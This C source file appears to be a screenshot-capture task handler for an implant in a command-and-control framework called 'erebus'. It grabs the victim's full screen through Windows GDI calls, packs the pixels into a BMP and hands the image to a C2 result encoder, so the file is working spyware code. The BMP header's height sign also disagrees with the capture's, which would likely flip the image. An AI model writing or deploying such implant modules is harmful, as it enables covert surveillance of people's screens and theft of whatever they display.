#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/task_handlers.h"

#pragma pack(push, 1)
typedef struct bmp_file_header {
    uint16_t type;
    uint32_t size;
    uint16_t r1, r2;
    uint32_t offset;
} bmp_file_header;

typedef struct bmp_info_header {
    uint32_t size;
    int32_t  width;
    int32_t  height;
    uint16_t planes;
    uint16_t bpp;
    uint32_t compression;
    uint32_t image_size;
    int32_t  xppm, yppm;
    uint32_t colors;
    uint32_t important;
} bmp_info_header;
#pragma pack(pop)

int erebus_task_screenshot(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)data;
    (void)data_len;
    int ok = 0;

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc_screen = GetDC(NULL);
    HDC hdc_mem = CreateCompatibleDC(hdc_screen);
    HBITMAP hbmp = CreateCompatibleBitmap(hdc_screen, sw, sh);
    HGDIOBJ old = SelectObject(hdc_mem, hbmp);
    BitBlt(hdc_mem, 0, 0, sw, sh, hdc_screen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi;
    memset(&bi, 0, sizeof(bi));
    bi.biSize = sizeof(bi);
    bi.biWidth = sw;
    bi.biHeight = -sh;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    size_t row = ((sw * 3 + 3) / 4) * 4;
    size_t pixels = row * (size_t)sh;
    uint8_t *px = (uint8_t *)malloc(pixels);
    if (!px) goto cleanup;

    if (!GetDIBits(hdc_mem, hbmp, 0, (UINT)sh, px, (BITMAPINFO *)&bi, DIB_RGB_COLORS)) {
        free(px);
        goto cleanup;
    }

    bmp_file_header fh = { 0x4D42, (uint32_t)(sizeof(fh) + sizeof(bmp_info_header) + pixels), 0, 0, sizeof(fh) + sizeof(bmp_info_header) };
    bmp_info_header ih = { sizeof(ih), sw, sh, 1, 24, BI_RGB, (uint32_t)pixels, 0, 0, 0, 0 };

    size_t total = sizeof(fh) + sizeof(ih) + pixels;
    uint8_t *img = (uint8_t *)malloc(total);
    if (!img) { free(px); goto cleanup; }
    memcpy(img, &fh, sizeof(fh));
    memcpy(img + sizeof(fh), &ih, sizeof(ih));
    memcpy(img + sizeof(fh) + sizeof(ih), px, pixels);
    free(px);

    ok = erebus_pb_encode_screenshot_result(img, total, (uint32_t)sw, (uint32_t)sh, out, out_len);
    free(img);

cleanup:
    SelectObject(hdc_mem, old);
    DeleteObject(hbmp);
    DeleteDC(hdc_mem);
    ReleaseDC(NULL, hdc_screen);
    return ok;
}